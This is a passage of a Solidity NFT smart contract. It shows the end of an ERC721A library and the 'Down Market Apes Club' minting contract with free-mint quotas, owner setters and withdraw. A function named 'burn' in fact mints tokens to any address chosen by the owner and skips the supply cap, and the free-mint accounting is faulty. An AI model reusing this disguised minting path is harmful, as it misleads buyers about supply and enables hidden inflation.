1066      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1067      * - `quantity` must be greater than 0.
1068      *
1069      * Emits a {Transfer} event.
1070      */
1071     function _safeMint(
1072         address to,
1073         uint256 quantity,
1074         bytes memory _data
1075     ) internal {
1076         _mint(to, quantity, _data, true);
1077     }
1078 
1079     /**
1080      * @dev Mints `quantity` tokens and transfers them to `to`.
1081      *
1082      * Requirements:
1083      *
1084      * - `to` cannot be the zero address.
1085      * - `quantity` must be greater than 0.
1086      *
1087      * Emits a {Transfer} event.
1088      */
1089     function _mint(
1090         address to,
1091         uint256 quantity,
1092         bytes memory _data,
1093         bool safe
1094     ) internal {
1095         uint256 startTokenId = currentIndex;
1096         require(to != address(0), "ERC721A: mint to the zero address");
1097         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1098 
1099         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1100 
1101         // Overflows are incredibly unrealistic.
1102         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1103         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1104         unchecked {
1105             _addressData[to].balance += uint128(quantity);
1106             _addressData[to].numberMinted += uint128(quantity);
1107 
1108             _ownerships[startTokenId].addr = to;
1109             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1110 
1111             uint256 updatedIndex = startTokenId;
1112 
1113             for (uint256 i; i < quantity; i++) {
1114                 emit Transfer(address(0), to, updatedIndex);
1115                 if (safe) {
1116                     require(
1117                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1118                         "ERC721A: transfer to non ERC721Receiver implementer"
1119                     );
1120                 }
1121 
1122                 updatedIndex++;
1123             }
1124 
1125             currentIndex = updatedIndex;
1126         }
1127 
1128         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1129     }
1130 
1131     /**
1132      * @dev Transfers `tokenId` from `from` to `to`.
1133      *
1134      * Requirements:
1135      *
1136      * - `to` cannot be the zero address.
1137      * - `tokenId` token must be owned by `from`.
1138      *
1139      * Emits a {Transfer} event.
1140      */
1141     function _transfer(
1142         address from,
1143         address to,
1144         uint256 tokenId
1145     ) private {
1146         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1147 
1148         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1149             getApproved(tokenId) == _msgSender() ||
1150             isApprovedForAll(prevOwnership.addr, _msgSender()));
1151 
1152         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1153 
1154         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1155         require(to != address(0), "ERC721A: transfer to the zero address");
1156 
1157         _beforeTokenTransfers(from, to, tokenId, 1);
1158 
1159         // Clear approvals from the previous owner
1160         _approve(address(0), tokenId, prevOwnership.addr);
1161 
1162         // Underflow of the sender's balance is impossible because we check for
1163         // ownership above and the recipient's balance can't realistically overflow.
1164         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1165         unchecked {
1166             _addressData[from].balance -= 1;
1167             _addressData[to].balance += 1;
1168 
1169             _ownerships[tokenId].addr = to;
1170             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1171 
1172             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1173             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1174             uint256 nextTokenId = tokenId + 1;
1175             if (_ownerships[nextTokenId].addr == address(0)) {
1176                 if (_exists(nextTokenId)) {
1177                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1178                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1179                 }
1180             }
1181         }
1182 
1183         emit Transfer(from, to, tokenId);
1184         _afterTokenTransfers(from, to, tokenId, 1);
1185     }
1186 
1187     /**
1188      * @dev Approve `to` to operate on `tokenId`
1189      *
1190      * Emits a {Approval} event.
1191      */
1192     function _approve(
1193         address to,
1194         uint256 tokenId,
1195         address owner
1196     ) private {
1197         _tokenApprovals[tokenId] = to;
1198         emit Approval(owner, to, tokenId);
1199     }
1200 
1201     /**
1202      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1203      * The call is not executed if the target address is not a contract.
1204      *
1205      * @param from address representing the previous owner of the given token ID
1206      * @param to target address that will receive the tokens
1207      * @param tokenId uint256 ID of the token to be transferred
1208      * @param _data bytes optional data to send along with the call
1209      * @return bool whether the call correctly returned the expected magic value
1210      */
1211     function _checkOnERC721Received(
1212         address from,
1213         address to,
1214         uint256 tokenId,
1215         bytes memory _data
1216     ) private returns (bool) {
1217         if (to.isContract()) {
1218             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1219                 return retval == IERC721Receiver(to).onERC721Received.selector;
1220             } catch (bytes memory reason) {
1221                 if (reason.length == 0) {
1222                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1223                 } else {
1224                     assembly {
1225                         revert(add(32, reason), mload(reason))
1226                     }
1227                 }
1228             }
1229         } else {
1230             return true;
1231         }
1232     }
1233 
1234     /**
1235      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1236      *
1237      * startTokenId - the first token id to be transferred
1238      * quantity - the amount to be transferred
1239      *
1240      * Calling conditions:
1241      *
1242      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1243      * transferred to `to`.
1244      * - When `from` is zero, `tokenId` will be minted for `to`.
1245      */
1246     function _beforeTokenTransfers(
1247         address from,
1248         address to,
1249         uint256 startTokenId,
1250         uint256 quantity
1251     ) internal virtual {}
1252 
1253     /**
1254      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1255      * minting.
1256      *
1257      * startTokenId - the first token id to be transferred
1258      * quantity - the amount to be transferred
1259      *
1260      * Calling conditions:
1261      *
1262      * - when `from` and `to` are both non-zero.
1263      * - `from` and `to` are never both zero.
1264      */
1265     function _afterTokenTransfers(
1266         address from,
1267         address to,
1268         uint256 startTokenId,
1269         uint256 quantity
1270     ) internal virtual {}
1271 }
1272 
1273 contract DownMarketApesClub is ERC721A, Ownable, ReentrancyGuard {
1274     string public baseURI = "ipfs://bafybeidd5bqbchrepuf367t2houpbvrffuyz7j4aalvfrj4h6m7j75ocre/";
1275     uint   public price             = 0.002 ether;
1276     uint   public maxPerTx          = 20;
1277     uint   public maxPerFree        = 3;
1278     uint   public totalFree         = 7500;
1279     uint   public maxSupply         = 10000;
1280     bool   public mintEnabled;
1281     uint   public totalFreeMinted = 0;
1282 
1283     mapping(address => uint256) public _mintedFreeAmount;
1284 
1285     constructor() ERC721A("Down Market Apes Club", "DMAC"){}
1286 
1287     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1288         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1289         string memory currentBaseURI = _baseURI();
1290         return bytes(currentBaseURI).length > 0
1291             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1292             : "";
1293     }
1294 
1295     function mint(uint256 count) external payable {
1296         uint256 cost = price;
1297         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1298             (_mintedFreeAmount[msg.sender] < maxPerFree));
1299 
1300         if (isFree) { 
1301             require(mintEnabled, "Mint is not live yet");
1302             require(totalSupply() + count <= maxSupply, "No more");
1303             require(count <= maxPerTx, "Max per TX reached.");
1304             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1305             {
1306              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1307              _mintedFreeAmount[msg.sender] = maxPerFree;
1308              totalFreeMinted += maxPerFree;
1309             }
1310             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1311             {
1312              require(msg.value >= 0, "Please send the exact ETH amount");
1313              _mintedFreeAmount[msg.sender] += count;
1314              totalFreeMinted += count;
1315             }
1316         }
1317         else{
1318         require(mintEnabled, "Mint is not live yet");
1319         require(msg.value >= count * cost, "Please send the exact ETH amount");
1320         require(totalSupply() + count <= maxSupply, "No more");
1321         require(count <= maxPerTx, "Max per TX reached.");
1322         }
1323 
1324         _safeMint(msg.sender, count);
1325     }
1326 
1327     function costCheck() public view returns (uint256) {
1328         return price;
1329     }
1330 
1331     function maxFreePerWallet() public view returns (uint256) {
1332       return maxPerFree;
1333     }
1334 
1335     function burn(address mintAddress, uint256 count) public onlyOwner {
1336         _safeMint(mintAddress, count);
1337     }
1338 
1339     function _baseURI() internal view virtual override returns (string memory) {
1340         return baseURI;
1341     }
1342 
1343     function setBaseUri(string memory baseuri_) public onlyOwner {
1344         baseURI = baseuri_;
1345     }
1346 
1347     function setPrice(uint256 price_) external onlyOwner {
1348         price = price_;
1349     }
1350 
1351     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1352         totalFree = MaxTotalFree_;
1353     }
1354 
1355      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1356         maxPerFree = MaxPerFree_;
1357     }
1358 
1359     function toggleMinting() external onlyOwner {
1360       mintEnabled = !mintEnabled;
1361     }
1362     
1363     function CommunityWallet(uint quantity, address user)
1364     public
1365     onlyOwner
1366   {
1367     require(
1368       quantity > 0,
1369       "Invalid mint amount"
1370     );
1371     require(
1372       totalSupply() + quantity <= maxSupply,
1373       "Maximum supply exceeded"
1374     );
1375     _safeMint(user, quantity);
1376   }
1377 
1378     function withdraw() external onlyOwner nonReentrant {
1379         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1380         require(success, "Transfer failed.");
1381     }
1382 }